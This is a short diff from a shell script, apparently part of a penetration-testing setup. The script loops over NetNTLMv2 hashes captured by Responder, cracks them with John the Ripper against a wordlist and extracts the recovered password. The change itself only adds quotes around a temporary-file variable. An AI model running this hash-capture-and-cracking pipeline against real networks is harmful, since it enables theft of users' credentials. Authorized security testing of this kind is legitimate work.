@@ -33,10 +33,10 @@ while [ $loop ]; do
 
 		# Let's crack the hash
 		temp=$(mktemp)
-		john --wordlist=/root/attack/wordlist.txt --format=netntlmv2 /usr/share/responder/DumpNTLMv2.txt --pot=$temp
+		john --wordlist=/root/attack/wordlist.txt --format=netntlmv2 /usr/share/responder/DumpNTLMv2.txt --pot="$temp"
 
 		# List the cracked hash
-		cracked=$(john --show --format=netntlmv2 /usr/share/responder/DumpNTLMv2.txt --pot=$temp | head -n 1 - | cut -d':' -f2 | grep -v 'password hash' | tr -d '\n')
+		cracked=$(john --show --format=netntlmv2 /usr/share/responder/DumpNTLMv2.txt --pot="$temp" | head -n 1 - | cut -d':' -f2 | grep -v 'password hash' | tr -d '\n')
 
 		# Check if there has been a cracked hash
 		if [ -n "$cracked" ]; then
